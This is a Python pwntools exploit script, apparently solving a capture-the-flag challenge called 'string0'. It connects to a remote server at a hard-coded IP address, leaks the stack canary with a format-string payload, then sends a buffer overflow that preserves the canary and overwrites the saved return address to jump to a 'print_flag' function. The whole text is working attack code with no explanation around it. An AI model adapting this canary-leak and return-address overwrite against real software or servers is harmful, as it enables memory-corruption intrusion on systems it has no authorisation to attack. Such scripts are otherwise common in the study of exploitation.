#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.arch = 'i386'

elf = ELF('./string0')
target_addr = elf.symbols['print_flag']

canary_leak_index=11
canary_offset = 16
eip_offset = 32

p = remote("107.191.51.129", 5001)
p.recvline()

leak_payload = f"%{canary_leak_index}$x".encode()
p.sendline(leak_payload)

canary = int(p.recvline().decode(), 16)
print("[+] Canary Leaked : 0x%x" % canary)

#==== BUFFER OVERFLOW ====
p.recvline()

payload = b'A'*canary_offset
payload += p32(canary)
payload += b'A'* (eip_offset - canary_offset - 4)
payload += p32(target_addr)

print("[+] Redirecting program flow to 0x%x" % target_addr)
p.sendline(payload)

print("Flag : %s" % p.recvline().decode().strip())
p.close()